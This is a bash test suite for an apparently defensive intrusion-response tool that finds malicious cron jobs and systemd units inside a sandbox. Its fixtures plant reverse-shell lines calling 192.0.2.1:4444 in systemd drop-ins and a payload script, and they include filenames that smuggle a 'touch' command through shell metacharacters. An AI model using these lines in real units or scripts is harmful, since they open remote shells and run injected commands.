#!/usr/bin/env bash
set -u

# Non-destructive sentry regressions. A user-namespace sandbox supplies fake
# triage/watch helpers and disposable /etc persistence directories; no host
# account, cron file, unit, or systemd manager is changed.

ROOT=$(CDPATH= cd -- "$(dirname -- "$0")/.." && pwd)
pass=0
fail=0

ok() { pass=$((pass + 1)); printf 'ok %s - %s\n' "$pass" "$1"; }
not_ok() { fail=$((fail + 1)); printf 'not ok %s - %s\n' "$((pass + fail))" "$1"; }
assert_file() { [ -f "$1" ] && ok "$2" || not_ok "$2"; }
assert_absent() { [ ! -e "$1" ] && [ ! -L "$1" ] && ok "$2" || not_ok "$2"; }
assert_grep() { grep -qE "$1" "$2" 2>/dev/null && ok "$3" || not_ok "$3"; }

if ! command -v bwrap >/dev/null 2>&1; then
  printf 'SKIP: bwrap is required for sentry self-test\n'
  exit 77
fi

test_root=$(mktemp -d "${TMPDIR:-/tmp}/ccdc-sentry-test.XXXXXX") || exit 1
case "$test_root" in /tmp/ccdc-sentry-test.*|"${TMPDIR:-/tmp}"/ccdc-sentry-test.*) ;; *) printf 'unsafe temp path\n' >&2; exit 1 ;; esac
cleanup() { rm -rf -- "$test_root"; }
trap cleanup EXIT INT TERM HUP

mkdir -p "$test_root/suite/lib" "$test_root/state" "$test_root/cron" "$test_root/systemd" "$test_root/bin"
: >"$test_root/null"
chmod 0666 "$test_root/null"
cp -- "$ROOT/linux/sentry.sh" "$test_root/suite/sentry.sh"
cp -- "$ROOT/linux/triage.sh" "$test_root/suite/real-triage.sh"
cp -- "$ROOT/linux/lib/common.sh" "$test_root/suite/lib/common.sh"
chmod 0755 "$test_root/suite/sentry.sh" "$test_root/suite/real-triage.sh"

cat >"$test_root/suite/triage.sh" <<'FAKE_TRIAGE'
#!/usr/bin/env bash
set -u
config=''
while [ "$#" -gt 0 ]; do
  case "$1" in --config) config=$2; shift 2 ;; --quiet) shift ;; *) exit 2 ;; esac
done
# shellcheck disable=SC1090
. "$config"
mode=$(cat "$CCDC_TEST_ROOT/mode")
out="$CCDC_EVIDENCE_DIR/triage.findings.$$"
case "$mode" in
  cron)
    printf 'RED|cron|/etc/cron.d/job;touch${IFS}PWNED|metacharacter filename\n' >"$out"
    ;;
  unit)
    printf 'RED|unit|/etc/systemd/system/evil.service|test unit\n' >"$out"
    ;;
  reviewed_one)
    printf 'RED|cron|/etc/cron.d/reviewed-old|reviewed item\n' >"$out"
    ;;
  reordered)
    printf 'RED|cron|/etc/cron.d/unreviewed-new|new item inserted first\n' >"$out"
    printf 'RED|cron|/etc/cron.d/reviewed-old|reviewed item moved to position two\n' >>"$out"
    ;;
  dropins)
    printf 'RED|unitdropin|scored.service::/etc/systemd/system/scored.service.d/direct.conf|direct malicious drop-in\n' >"$out"
    printf 'RED|unitdropindeep|scored.service::/etc/systemd/system/scored.service.d/deep.conf::%s/deep-payload.sh|deep malicious drop-in\n' "$CCDC_TEST_ROOT" >>"$out"
    ;;
  clean)
    : >"$out"
    ;;
  fail)
    exit 9
    ;;
  *) exit 8 ;;
esac
mv "$out" "$CCDC_EVIDENCE_DIR/triage.findings"
[ "$mode" = clean ] && exit 0
exit 3
FAKE_TRIAGE

cat >"$test_root/suite/watch.sh" <<'FAKE_WATCH'
#!/usr/bin/env bash
[ -n "${CCDC_TEST_ROOT:-}" ] && printf 'watch ran\n' >>"$CCDC_TEST_ROOT/watch-runs"
exit 0
FAKE_WATCH
chmod 0755 "$test_root/suite/triage.sh" "$test_root/suite/watch.sh"

cat >"$test_root/bin/timeout" <<'FAKE_TIMEOUT'
#!/usr/bin/env bash
limit=$1
shift
[ -n "${CCDC_TEST_ROOT:-}" ] && printf '%s|%s\n' "$limit" "${1##*/}" >>"$CCDC_TEST_ROOT/timeout-calls"
exec "$@"
FAKE_TIMEOUT
chmod 0755 "$test_root/bin/timeout"

cat >"$test_root/runner.sh" <<'RUNNER'
#!/usr/bin/env bash
set -u
test_root=$1
suite="$test_root/suite"
state="$test_root/state"
config="$test_root/test.env"
PATH="$test_root/bin:$PATH"
export PATH
pass=0
fail=0
ok() { pass=$((pass + 1)); printf 'ok %s - %s\n' "$pass" "$1"; }
bad() { fail=$((fail + 1)); printf 'not ok %s - %s\n' "$((pass + fail))" "$1"; }
has() { grep -qE "$1" "$2" 2>/dev/null && ok "$3" || bad "$3"; }

write_config() {
  services=$1
  cat >"$config" <<EOF
CCDC_BOX_NAME="self-test"
CCDC_EVIDENCE_DIR="$state"
CCDC_ALLOWED_USERS="root"
CCDC_SYSTEMD_SERVICES="$services"
CCDC_SENTRY_INTERVAL="20"
CCDC_WATCH_INTERVAL="30"
CCDC_TEST_ROOT="$test_root"
EOF
}

# A path that would create PWNED if reconstructed and sent through sh -c.
printf 'payload\n' >'/etc/cron.d/job;touch${IFS}PWNED'
printf 'cron\n' >"$test_root/mode"
write_config ssh
cd "$test_root" || exit 1
"$suite/sentry.sh" --config "$config" --once --no-bell >/dev/null
has '^RED[|]cron[|]/etc/cron.d/job;touch[$][{]IFS[}]PWNED$' "$state/sentry.queue" \
  'queue stores structured fields, not a command'
"$suite/sentry.sh" --config "$config" --status >/dev/null
if "$suite/sentry.sh" --config "$config" --approve --apply >/dev/null; then
  ok 'metacharacter-path approval completed'
else
  bad 'metacharacter-path approval completed'
fi
[ ! -e '/etc/cron.d/job;touch${IFS}PWNED' ] && ok 'exact malicious filename removed' || bad 'exact malicious filename removed'
[ ! -e "$test_root/PWNED" ] && ok 'shell metacharacters were never evaluated' || bad 'shell metacharacters were never evaluated'
has '[|]cron[|]/etc/cron.d/job;touch[$][{]IFS[}]PWNED[|]' "$state/sentry.undo" \
  'approval record names structured subject and evidence'

# A queue made under the old config must be rebuilt under the new protection
# list before approval. The fake triage continues to report the same unit.
printf '[Service]\nExecStart=/bin/false\n' >'/etc/systemd/system/evil.service'
printf 'unit\n' >"$test_root/mode"
write_config ssh
"$suite/sentry.sh" --config "$config" --once --no-bell >/dev/null
has '^RED[|]unit[|]/etc/systemd/system/evil.service$' "$state/sentry.queue" \
  'unprotected current unit queued'
"$suite/sentry.sh" --config "$config" --status >/dev/null
write_config 'ssh evil.service'
if "$suite/sentry.sh" --config "$config" --approve --apply >"$test_root/stale.out"; then
  ok 'approval refresh accepted changed protection config'
else
  bad 'approval refresh accepted changed protection config'
fi
[ -f /etc/systemd/system/evil.service ] && ok 'newly protected unit was not removed' || bad 'newly protected unit was not removed'
[ ! -s "$state/sentry.queue" ] && ok 'stale queue entry was discarded' || bad 'stale queue entry was discarded'

# Findings that disappear leave seen, and therefore queue again if they return.
printf 'clean\n' >"$test_root/mode"
"$suite/sentry.sh" --config "$config" --once --no-bell >/dev/null
write_config ssh
printf 'unit\n' >"$test_root/mode"
"$suite/sentry.sh" --config "$config" --once --no-bell >/dev/null
has '^RED[|]unit[|]/etc/systemd/system/evil.service$' "$state/sentry.queue" \
  'disappeared finding queues again when it returns'

# Numeric approval is bound to what --status showed, not to a freshly
# re-numbered queue. Insert a new item ahead of reviewed item 1 before approve.
printf 'old\n' >'/etc/cron.d/reviewed-old'
printf 'new\n' >'/etc/cron.d/unreviewed-new'
printf 'reviewed_one\n' >"$test_root/mode"
"$suite/sentry.sh" --config "$config" --once --no-bell >/dev/null
"$suite/sentry.sh" --config "$config" --status >"$test_root/reviewed.out"
has 'Reviewed approval snapshot frozen' "$test_root/reviewed.out" \
  'status freezes the queue identity the operator reviewed'
printf 'reordered\n' >"$test_root/mode"
if "$suite/sentry.sh" --config "$config" --approve 1 --apply >/dev/null; then
  ok 'approval survives live queue reordering'
else
  bad 'approval survives live queue reordering'
fi
[ ! -e /etc/cron.d/reviewed-old ] && ok 'approved identity was removed' || bad 'approved identity was removed'
[ -e /etc/cron.d/unreviewed-new ] && ok 'new unreviewed item was not substituted' || bad 'new unreviewed item was not substituted'

# A protected/scored service must protect its legitimate unit, not an injected
# drop-in attached to it. Exercise both direct malicious content and a clean
# drop-in that points one hop down to the payload.
mkdir -p /etc/systemd/system/scored.service.d
printf '[Service]\nExecStartPost=/bin/bash -c "bash -i >& /dev/tcp/192.0.2.1/4444 0>&1"\n' \
  >/etc/systemd/system/scored.service.d/direct.conf
printf '[Service]\nExecStartPost=%s/deep-payload.sh\n' "$test_root" \
  >/etc/systemd/system/scored.service.d/deep.conf
printf '#!/bin/sh\nbash -i >& /dev/tcp/192.0.2.1/4444 0>&1\n' >"$test_root/deep-payload.sh"
chmod 0755 "$test_root/deep-payload.sh"
printf '[Service]\nExecStart=/bin/bash -c "bash -i >& /dev/tcp/192.0.2.1/4444 0>&1"\n' \
  >'/etc/systemd/system/evil;touch_PWNED.service'
write_config 'ssh scored.service'
"$suite/real-triage.sh" --config "$config" --quiet \
  --findings-file "$state/dropin.findings" >"$test_root/real-triage.out" || triage_rc=$?
[ "${triage_rc:-0}" -eq 3 ] && ok 'real triage reports malicious drop-ins' || bad 'real triage reports malicious drop-ins'
has '^RED[|]unitdropin[|]scored.service::/etc/systemd/system/scored.service.d/direct.conf[|]' \
  "$state/dropin.findings" 'direct drop-in gets its own machine finding'
has '^RED[|]unitdropindeep[|]scored.service::/etc/systemd/system/scored.service.d/deep.conf::.*deep-payload.sh[|]' \
  "$state/dropin.findings" 'clean drop-in is followed one hop to its payload'
has 'evil\\;touch_PWNED.service' "$test_root/real-triage.out" \
  'paste-ready unit commands shell-quote an attacker-controlled filename'
printf 'dropins\n' >"$test_root/mode"
"$suite/sentry.sh" --config "$config" --once --no-bell >/dev/null
has '^RED[|]unitdropin[|]scored.service::/etc/systemd/system/scored.service.d/direct.conf$' \
  "$state/sentry.queue" 'scored unit protection does not shield a malicious drop-in'
has '^RED[|]unitdropindeep[|]scored.service::/etc/systemd/system/scored.service.d/deep.conf::.*deep-payload.sh$' \
  "$state/sentry.queue" 'deep drop-in remediation reaches the approval queue'

# A dead supervisor must not leave an old calm-looking ALERTS file as the only
# output of --status. Age the completion marker and require a loud warning.
touch -t 200001010000 "$state/sentry.last-pass"
"$suite/sentry.sh" --config "$config" --status >"$test_root/stale-status.out"
has '^WARNING: last sentry pass is .* old' "$test_root/stale-status.out" \
  'status calls out a stale supervisor report'

# Detector failure must clear actions and become an explicit health alarm.
printf 'fail\n' >"$test_root/mode"
rm -f "$state/sentry.watch.last"
watch_before=$(wc -l <"$test_root/watch-runs" 2>/dev/null || printf 0)
"$suite/sentry.sh" --config "$config" --once --no-bell >/dev/null
[ ! -s "$state/sentry.queue" ] && ok 'triage failure clears actionable queue' || bad 'triage failure clears actionable queue'
has 'MONITOR HEALTH PROBLEM' "$state/ALERTS" 'triage failure is visible in ALERTS'
has 'exit 9' "$state/sentry.health.triage" 'triage failure records exit status'
watch_after=$(wc -l <"$test_root/watch-runs" 2>/dev/null || printf 0)
[ "$watch_after" -gt "$watch_before" ] && ok 'triage failure does not suppress the independent watch layer' || bad 'triage failure does not suppress the independent watch layer'
has '^45[|]triage.sh$' "$test_root/timeout-calls" 'triage runs behind its configured deadline'
has '^90[|]watch.sh$' "$test_root/timeout-calls" 'watch runs behind its configured deadline'

printf 'sentry self-test: %s passed, %s failed\n' "$pass" "$fail"
[ "$fail" -eq 0 ]
RUNNER
chmod 0755 "$test_root/runner.sh"

if ! bwrap --die-with-parent --unshare-user --uid 0 --gid 0 --unshare-pid \
    --proc /proc --dev-bind /dev /dev --ro-bind / / \
    --bind "$test_root" "$test_root" \
    --bind "$test_root/null" /dev/null \
    --bind "$test_root/cron" /etc/cron.d \
    --bind "$test_root/systemd" /etc/systemd/system \
    /bin/bash "$test_root/runner.sh" "$test_root"; then
  printf 'sentry self-test failed\n' >&2
  [ ! -f "$test_root/state/sentry.log" ] || tail -n 30 "$test_root/state/sentry.log" >&2
  exit 1
fi

# --- source-level guarantees, on the host ------------------------------------
#
# These read the scripts rather than run them, so they belong out here: inside
# the sandbox $ROOT is not set and they silently did nothing while making the
# whole suite exit non-zero.
hpass=0; hfail=0
hok() { hpass=$((hpass + 1)); printf 'ok - %s\n' "$1"; }
hno() { hfail=$((hfail + 1)); printf 'not ok - %s\n' "$1"; }

# --- every check triage can emit must be answered by sentry --------------------
#
# This is the finish-line guarantee, and it is the one that was missing. Sentry
# printed one line - "held: this finding needs judgement or is not safely
# automatable" - under every finding it would not act on, regardless of what the
# finding was. Detection was thorough and then the tool went quiet at the exact
# moment the operator needed it.
#
# So: every check type triage emits must be EITHER actionable by sentry, or have
# written guidance in held_reason that says what to compare and what to run.
gap=$(python3 - "$ROOT" <<'SCAN'
import re, sys, os
root = sys.argv[1]
triage = open(os.path.join(root, 'linux', 'triage.sh'), encoding='utf-8').read()
sentry = open(os.path.join(root, 'linux', 'sentry.sh'), encoding='utf-8').read()

emitted = set(re.findall(r'emit\s+\w+\s+([a-z0-9]+)\s', triage))

def arms(src, fn):
    m = re.search(r'\n' + fn + r'\(\) \{(.*?)\n\}\n', src, re.S)
    if not m:
        return set()
    out = set()
    for line in m.group(1).splitlines():
        mm = re.match(r'^\s*([a-z0-9|]+)\)', line)
        if mm:
            for part in mm.group(1).split('|'):
                if part and part != '*':
                    out.add(part)
    return out

answered = arms(sentry, 'actionable') | arms(sentry, 'held_reason') | arms(sentry, 'render_action')
print(' '.join(sorted(k for k in emitted if k not in answered)))
SCAN
)
if [ -z "$gap" ]; then
  hok 'every check triage emits is either actionable or has written guidance'
else
  hno "checks with no action and no written reason:$gap"
fi

# The generic line must not be the answer for anything real.
if grep -q 'this finding needs judgement or is not safely automatable' "$ROOT/linux/sentry.sh"; then
  hno 'the generic "needs judgement" boilerplate is still printed'
else
  hok 'the generic "needs judgement" boilerplate is gone'
fi

# Guidance has to hand over a command, not a path. A path cannot be pasted.
if awk '/^held_reason\(\)/,/^}/' "$ROOT/linux/sentry.sh" | grep -qE 'sudo |diff |grep '; then
  hok 'the guidance hands over commands, not bare paths'
else
  hno 'the guidance names files without saying how to open them'
fi

# Never by list position: the list re-sorts between reading and acting.
if awk '/^held_reason\(\)/,/^}/' "$ROOT/linux/sentry.sh" | grep -qE '\-\-key [ab]\b'; then
  hno 'a destructive command identifies its target by position in a list'
else
  hok 'destructive commands name their target, never a row letter'
fi


printf 'sentry source checks: %s passed, %s failed\n' "$hpass" "$hfail"
[ "$hfail" -eq 0 ] || exit 1
